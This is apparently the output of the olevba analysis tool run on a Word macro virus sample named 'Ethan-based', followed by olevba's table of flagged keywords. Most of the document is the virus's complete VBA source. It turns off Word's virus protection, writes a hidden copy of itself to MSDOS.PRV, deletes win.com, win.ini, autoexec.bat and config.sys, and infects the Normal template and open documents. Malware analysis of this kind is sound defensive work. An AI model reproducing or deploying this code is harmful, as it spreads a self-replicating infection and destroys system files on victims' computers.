olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan-based-6cd50ba1df9eda164a824170a5c488ce3bfea9d7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan-based-6cd50ba1df9eda164a824170a5c488ce3bfea9d7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
ADS = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If Dir("MSDOS.PRV", 6) = "" Then
Open "MSDOS.PRV" For Output As #1
For iLoop = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
CodeLine = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(iLoop, 1)
Print #1, CodeLine
Next iLoop
Close #1
SetAttr "MSDOS.PRV", 6
End If
If Dir("C:\windows\win.com") <> "" Then Kill "C:\windows\win.com"
If Dir("C:\windows\win.ini") <> "" Then Kill "C:\windows\win.ini"
If Dir("C:\autoexec.bat") <> "" Then Kill "C:\autoexec.bat"
If Dir("C:\config.sys") <> "" Then Kill "C:\config.sys"
If Dir("C:\windows\class.sys") <> "" Then Kill "C:\windows\class.sys"
If Dir("C:\class.sys") <> "" Then Kill "C:\class.sys"
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set TheItem = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set TheItem = ActiveDocument.VBProject.VBComponents.Item(1)
Else
TheItem = ""
End If
If TheItem <> "" Then
Open "MSDOS.PRV" For Input As #1
If LOF(1) = 0 Then GoTo Fin
Count = 1
Do While Not EOF(1)
Line Input #1, CodeLine
TheItem.CodeModule.InsertLines Count, CodeLine
Count = Count + 1
Loop
Fin:
Close #1
With Dialogs(wdDialogFileSummaryInfo): .Title = "OOPS": .Author = "Billy McGrop": .Keywords = "To Vile": .Execute: End With
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> ADS Then ActiveDocument.Saved = ADS
End Sub


Private Sub Document_Open()
'This subroutine is executed when the document is opened.
        Call OpenDocument
End Sub

Private Sub UnprotectDocument()
'This subroutine is not called.  It is included so that
'it can be run if you need to unprotect the document.
'If you halt or breakpoint during execution, always
'run this subroutine.
    MasterDocument.Unprotect Password:=MasterPassword
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

